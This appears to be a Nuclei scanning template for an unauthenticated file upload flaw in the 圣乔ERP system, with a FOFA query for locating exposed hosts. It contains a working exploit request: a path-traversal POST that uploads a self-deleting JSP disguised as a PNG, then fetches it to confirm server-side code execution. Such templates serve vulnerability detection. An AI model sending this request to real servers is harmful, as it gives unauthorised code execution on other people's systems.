id: shengqiao-erp-file-upload

info:
  name: 圣乔ERP系统uploadFile文件上传漏洞
  author: qwtd
  severity: critical
  description: |
    圣乔ERP系统 uploadFile.action 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%9C%A3%E4%B9%94ERP/%E5%9C%A3%E4%B9%94ERP%E7%B3%BB%E7%BB%9FuploadFile%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    max-request: 1
    fofa-query: title="圣乔ERP系统"
  tags: 圣乔ERP

http:
  - raw:
      - |
        POST /erp/wap/../uploadFile.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Content-Type: multipart/form-data boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip
        Connection: close

        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
        Content-Disposition: form-data; name="Filedata"; filename="{{randstr_1}}.jsp"
        Content-Type: image/png

        <% out.print("{{randstr_2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--

      - |
        GET /erp/wap/../FileStorageDirectorynull/{{randstr_1}}.jsp HTTP/1.1
        Host: {{Hostname}}
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{randstr_2}}"
      - type: dsl
        dsl:
          - "status_code_1==200 && status_code_2==200"
